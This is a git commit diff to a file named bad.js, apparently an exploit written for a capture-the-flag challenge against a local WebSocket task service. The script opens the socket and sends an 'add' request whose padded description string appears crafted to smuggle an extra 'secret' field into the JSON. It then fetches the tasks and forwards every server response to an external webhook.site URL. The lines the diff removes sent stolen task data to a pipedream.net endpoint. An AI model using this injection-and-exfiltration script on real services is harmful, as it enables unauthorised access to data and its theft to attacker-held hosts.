28adf0cfe276a567d1b4ea58326b8d2b567f42de
FlyLevin <FlyLevin@users.noreply.github.com>
2024-01-19 21:30:19 -0600

    Update bad.js

--- bad.js
+++ bad.js
@@ -1,16 +1,9 @@
-const ws = new WebSocket(`ws://127.0.0.1/ws`);
+const target = '127.0.0.1';
+const ws = new WebSocket(`ws://${target}/ws`);
 ws.onopen = () => {
-    ws.send(JSON.stringify({ action: 'add' }))
-    ws.send(JSON.stringify({ action: 'get' }))
+    ws.send(JSON.stringify({action:'add',title: 'A',description: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","secret":"00000000000000000000000000000000"}`}));
+    ws.send(JSON.stringify({action:'get'}));
 }
-
 ws.onmessage = async (msg) => {
-    const data = JSON.parse(msg.data);
-    if (data.success) {
-        if (data.action === 'get') {
-            fetch("https://eoljadkzojbxa0x.m.pipedream.net/" + JSON.stringify(data.tasks ))
-        }
-        else if (data.action === 'add') {
-        }
-    }
+    fetch(`https://webhook.site/22e38bf9-9655-4361-be5e-7888c08d694e?m=${msg.data}`)
 }
